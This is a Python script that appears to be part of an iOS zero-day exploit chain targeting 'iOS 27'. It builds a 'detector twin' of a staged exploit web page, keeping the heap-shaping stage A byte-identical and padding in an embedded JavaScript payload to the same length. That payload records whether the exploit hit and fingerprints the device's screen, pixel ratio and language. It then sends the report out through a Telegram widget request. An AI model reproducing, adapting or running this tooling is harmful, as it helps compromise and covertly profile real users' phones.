#!/usr/bin/env python3
"""iOS 27 (17e) detector twin — final-shaped, same raw length (host-only).

The 17e final (n1_ios_univA_final.html, 6,295 B) is stage A (2,518 B) + stage B
(3,636 B) + keepalive (31 B).  The detector keeps stage A and the keepalive
byte-identical and replaces stage B with a same-length `dummy + report`, so the
stage-A heap class matches the final.  Host rule (validated on Android and on
the 6s at_* pair): stage-C content is irrelevant, only the length is.

Outputs ios27/detector_ios27.html, final_ios27.html, m_det.html, m_fin.html.
"""
import hashlib, json, os, re, zlib

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(HERE, "..", "ios_0day_chain_20261108", "widget",
                   "n1_ios_univA_final.html")
OUT = os.path.join(HERE, "ios27")

REPORT = r'''!function(){var s='P2',B=[],i,m=0,sel=0,vk=0,ph=0,el=0,t=globalThis.V,t0=Date.now();try{var mk=(typeof globalThis.N1MARK=='string')?globalThis.N1MARK:'';m=(mk.indexOf('ABLEN')==0)?1:0;var q=mk.match(/ph=(\d+)/);if(q)ph=+q[1];q=mk.match(/vk=(\d+)/);if(q)vk=+q[1];q=mk.match(/ABLEN\[(\d+)\]/);if(q)sel=+q[1];el=Math.min(65535,Date.now()-t0)}catch(e){}function P(v,w){for(var j=w-1;j>=0;j--)B.push(v>>8*j&255)}P(2,1);P(3,1);P(4,1);P(m,1);P(0,1);P(sel,2);P(vk,2);P(0,2);P(ph,1);P(Math.min(255,Math.round((typeof devicePixelRatio=='number'?devicePixelRatio:1)*10)),1);P(Math.min(4095,(typeof screen!='undefined'&&screen.width)||0),2);P(Math.min(4095,(typeof screen!='undefined'&&screen.height)||0),2);var L=(typeof navigator!='undefined'&&navigator.language)||'';P(L.charCodeAt(0)||63,1);P(L.charCodeAt(1)||63,1);P(128,1);P(1,1);P(el,2);for(i=0;i<B.length;i++)s+=('0'+B[i].toString(16)).slice(-2);globalThis.REP=s;try{var d=document.getElementById('v');if(d)d.textContent='DET '+(m?'HIT':'MISS')+' SEL='+sel+' VK='+vk+' PH='+ph+' R='+s}catch(e){}try{if(typeof TelegramWidget!='undefined'&&TelegramWidget.request){var p=TelegramWidget.request(s);if(p&&p.then)p.then(function(){},function(){})}}catch(e){}}();'''


def pad_to(s, n):
    d = n - len(s)
    if d < 0:
        raise ValueError("too long %d > %d" % (len(s), n))
    return s if d == 0 else (s + " " * d if d < 4 else s + "/*" + "p" * (d - 4) + "*/")


def main():
    h = open(SRC, encoding="utf-8").read()
    parts = list(re.finditer(r'<script[^>]*>(.*?)</script>', h, re.S))
    assert len(parts) == 3, len(parts)
    s1, s2 = parts[0].group(1), parts[1].group(1)
    L2 = len(s2)
    det = h[:parts[1].start(1)] + pad_to(REPORT, L2) + h[parts[1].end(1):]
    assert len(det) == len(h), (len(det), len(h))
    os.makedirs(OUT, exist_ok=True)

    def wr(name, s):
        open(os.path.join(OUT, name), "w").write(s)
        return {"raw": len(s.encode()), "zlib9": len(zlib.compress(s.encode(), 9)),
                "sha256": hashlib.sha256(s.encode()).hexdigest()}
    out = {"detector_ios27": wr("detector_ios27.html", det),
           "final_ios27": wr("final_ios27.html", h)}
    mock = ('var TelegramWidget={request:function(d){globalThis.REP=d;'
            'return new Promise(function(r){r(Object.freeze({result:"K"}))})}};')
    mdet = h[:parts[1].start(1)] + pad_to(mock + REPORT, L2) + h[parts[1].end(1):]
    assert len(mdet) == len(h)
    wr("m_det.html", mdet)
    wr("m_fin.html", h)
    print(json.dumps(out, indent=1))
    print("stageB_len", L2, "page", len(h))


if __name__ == "__main__":
    main()
